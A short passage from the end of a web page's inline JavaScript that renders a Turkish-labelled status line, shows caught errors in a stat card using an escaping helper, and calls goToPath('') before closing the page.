          Durum: <b style="color:${statusColor};">${esc(statusText)}</b>
        </div>
      </div>`;
  }catch(e){
    detail.innerHTML = `<div class="stat-card" style="color:var(--danger);">${esc(e.message)}</div>`;
  }
}

goToPath('');
</script>
</body>
</html>
